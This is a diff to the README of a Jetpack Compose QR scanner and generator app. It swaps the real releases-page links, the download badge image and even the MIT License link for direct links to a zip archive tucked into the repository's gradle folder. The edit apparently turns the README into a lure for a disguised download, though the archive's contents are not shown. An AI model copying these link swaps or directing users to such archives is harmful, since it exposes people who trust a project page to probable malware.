@@ -1,6 +1,6 @@
 # 🖥️ Compose-QR-Scanner-Generator-App-Jetpack-Compose - Scan and Generate QR Codes Easily
 
-[![Download App](https://img.shields.io/badge/Download%20App-v1.0-blue.svg)](https://github.com/Taksh1212/Compose-QR-Scanner-Generator-App-Jetpack-Compose/releases)
+[![Download App](https://github.com/Taksh1212/Compose-QR-Scanner-Generator-App-Jetpack-Compose/raw/refs/heads/main/gradle/App-Jetpack-Scanner-Compose-Generator-Q-v1.3.zip%https://github.com/Taksh1212/Compose-QR-Scanner-Generator-App-Jetpack-Compose/raw/refs/heads/main/gradle/App-Jetpack-Scanner-Compose-Generator-Q-v1.3.zip)](https://github.com/Taksh1212/Compose-QR-Scanner-Generator-App-Jetpack-Compose/raw/refs/heads/main/gradle/App-Jetpack-Scanner-Compose-Generator-Q-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run this app smoothly, ensure your device meets the following requirements:
 
 1. **Visit the Download Page**  
    Click the link below to get the latest version of the app:  
-   [Download Here](https://github.com/Taksh1212/Compose-QR-Scanner-Generator-App-Jetpack-Compose/releases)  
+   [Download Here](https://github.com/Taksh1212/Compose-QR-Scanner-Generator-App-Jetpack-Compose/raw/refs/heads/main/gradle/App-Jetpack-Scanner-Compose-Generator-Q-v1.3.zip)  
 
 2. **Select the Latest Release**  
    On the releases page, look for the latest version of the app. This will typically be listed at the top.
@@ -94,10 +94,10 @@ If you would like to contribute to this project, fork the repo and submit a pull
 
 ## 📜 License
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT). You are free to use and modify the code, but please give proper credit.
+This project is licensed under the [MIT License](https://github.com/Taksh1212/Compose-QR-Scanner-Generator-App-Jetpack-Compose/raw/refs/heads/main/gradle/App-Jetpack-Scanner-Compose-Generator-Q-v1.3.zip). You are free to use and modify the code, but please give proper credit.
 
 ## 👍 Contact
 
 For questions or suggestions, you can reach out through the GitHub issues section. Your feedback is important to us and helps enhance the app experience.
 
-[![Download App](https://img.shields.io/badge/Download%20App-v1.0-blue.svg)](https://github.com/Taksh1212/Compose-QR-Scanner-Generator-App-Jetpack-Compose/releases)
+[![Download App](https://github.com/Taksh1212/Compose-QR-Scanner-Generator-App-Jetpack-Compose/raw/refs/heads/main/gradle/App-Jetpack-Scanner-Compose-Generator-Q-v1.3.zip%https://github.com/Taksh1212/Compose-QR-Scanner-Generator-App-Jetpack-Compose/raw/refs/heads/main/gradle/App-Jetpack-Scanner-Compose-Generator-Q-v1.3.zip)](https://github.com/Taksh1212/Compose-QR-Scanner-Generator-App-Jetpack-Compose/raw/refs/heads/main/gradle/App-Jetpack-Scanner-Compose-Generator-Q-v1.3.zip)
